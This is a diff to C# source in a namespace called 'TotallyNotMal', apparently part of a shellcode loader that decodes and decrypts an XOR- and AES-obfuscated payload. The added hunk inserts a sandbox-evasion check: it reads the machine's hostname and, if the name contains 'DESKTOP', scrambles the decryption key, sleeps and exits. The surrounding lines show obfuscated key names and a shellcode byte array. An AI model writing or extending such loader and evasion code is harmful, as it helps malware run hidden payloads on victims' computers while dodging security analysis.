@@ -189,6 +189,15 @@ namespace TotallyNotMal
             string aE5k3y = rahsia("REPLACE A3S_KEY");
             string aE5Iv = rahsia("REPLACE A3S_IV");
 
+            // sandbox check
+            string hostName = Environment.GetEnvironmentVariable("COMPUTERNAME");
+            if (hostName.Contains("DESKTOP"))
+            {
+                xorKey = xorKey.Remove(0).Insert(0, "~"); //just to be safe
+                System.Threading.Thread.Sleep(5000);
+                return;
+            }
+
             byte[] sh3Llc0d3 = new byte[] { };
 
             byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xoredAesB64), xorKey);
